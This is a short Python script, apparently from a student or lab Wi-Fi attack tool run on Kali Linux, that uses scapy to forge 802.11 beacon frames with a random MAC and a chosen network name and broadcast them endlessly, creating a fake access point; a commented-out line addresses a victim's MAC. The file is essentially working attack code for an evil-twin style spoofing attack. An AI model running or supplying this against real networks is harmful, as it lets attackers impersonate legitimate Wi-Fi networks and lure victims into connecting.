import os
# We require regular expressions.
import re
import csv
# We will be using the subprocess module to run commands on Kali Linux.
import subprocess
from scapy.all import *
from scapy.layers.l2 import ARP, Ether

active_wireless_networks = []

def create_fake_access_point(WifiAdapter , MacAd , Victim_MA , ChosenWifiSSID):
    # interface to use to send beacon frames, must be in monitor mode

    # generate a random MAC address (built-in in scapy)

    # SSID (name of access point)
    # ssid = "AYA - Amir Hetzroni"
    # 802.11 frame

    # dot11 = Dot11(type=0, subtype=8, addr1=Victim_MA, addr2=MacAd, addr3=MacAd)

    mac = RandMAC()
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    # beacon layer
    beacon = Dot11Beacon()
    # putting ssid in the frame
    essid = Dot11Elt(ID="SSID", info=ChosenWifiSSID, len=len(ChosenWifiSSID))
    # stack all the layers and add a RadioTap
    frame = RadioTap() / dot11 / beacon / essid
    # send the frame in layer 2 every 100 milliseconds forever
    # using the `iface` interface
    sendp(frame, inter=0.1, iface=WifiAdapter, loop=1 , verbose = 0)